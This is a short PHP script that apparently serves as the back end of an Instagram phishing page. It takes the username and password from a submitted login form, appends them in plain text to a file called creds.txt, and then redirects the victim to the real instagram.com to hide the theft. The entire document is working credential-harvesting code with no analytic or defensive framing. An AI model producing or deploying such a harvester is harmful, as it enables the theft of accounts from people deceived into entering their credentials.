<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $user = $_POST['username'];
    $pass = $_POST['password'];

    $file = fopen("creds.txt", "a");
    fwrite($file, "Username: " . $user . " | Password: " . $pass . "\n");
    fclose($file);
}
header("Location: https://instagram.com");
exit();
?>
